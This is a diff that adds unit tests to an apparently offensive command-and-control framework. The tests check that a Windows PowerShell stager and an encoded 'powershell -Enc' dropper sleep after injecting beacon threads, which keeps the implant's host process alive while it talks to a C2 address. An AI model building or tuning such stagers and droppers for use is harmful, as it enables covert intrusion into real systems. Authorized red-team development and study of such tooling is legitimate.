@@ -108,5 +108,38 @@ class TestShortStager(unittest.TestCase):
         self.assertEqual(ss.loader_notes("linux"), ())
 
 
+class TestTheStagerKeepsItsHostAlive(unittest.TestCase):
+    """The beacon's threads live INSIDE the stager's PowerShell process.
+
+    Measured 2026-11-03 on the operator host: one check-in at +6 s and then
+    silence, because the script ended and the process exited taking the
+    injected threads with it — which reads as "the payload failed". The sleep
+    is served by the C2 (so it costs nothing to type) and bounded, so a
+    failed injection does not leave a process behind for ever.
+    """
+
+    def test_the_served_script_sleeps_after_injecting(self):
+        from phantom.utils.builder import windows_stager_script
+
+        script = windows_stager_script("10.0.0.5", 8443, use_ssl=True)
+        self.assertIn("Start-Sleep -Seconds 43200", script)
+        # the sleep must come AFTER the invocation, or it delays the payload
+        self.assertLess(script.index(".Invoke()"),
+                        script.index("Start-Sleep -Seconds 43200"))
+
+    def test_the_typed_one_liner_sleeps_too(self):
+        # Same body either way: the launcher is `powershell -Enc <b64>`, so the
+        # claim "the typed and served artefacts are the same bytes" is checked
+        # by decoding rather than by grepping the base64.
+        import base64
+
+        launcher = generate_dropper("windows", "10.0.0.5", 8443,
+                                    arch="x64", dl_port=8443,
+                                    use_ssl=True, resilient=False)
+        blob = launcher.rsplit(" ", 1)[-1]
+        body = base64.b64decode(blob).decode("utf-16-le")
+        self.assertIn("Start-Sleep -Seconds 43200", body)
+
+
 if __name__ == "__main__":
     unittest.main()
